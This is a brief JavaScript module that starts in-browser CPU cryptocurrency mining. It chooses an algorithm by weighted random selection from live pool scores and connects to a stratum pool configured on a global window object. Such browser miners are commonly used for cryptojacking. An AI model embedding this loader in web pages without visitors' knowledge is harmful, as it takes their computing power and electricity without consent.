
    import fetchpool from "./poolconf.js"
    import { start } from "@marco_ciaramella/cpu-web-miner"

    fetchpool(window.weba2.hosts).then(realtime=>{

        let total = 0;
        let weighted = window.weba2.weighted;
        
        for (let i = 0; i < weighted.length; i++) {
            if (realtime) weighted[i].score = realtime[weighted[i].algo];
            total += weighted[i].score;
        }

        let choice = Math.random() * total;
        let prev = 0;
       
        const select = (()=>{
            for (let i = 0; i < weighted.length; i++) {
                if (choice <= prev + weighted[i].score) return weighted[i];
                else prev += weighted[i].score;
            }
        })();

        start(select.algo, window.weba2.stratum(select));
    })
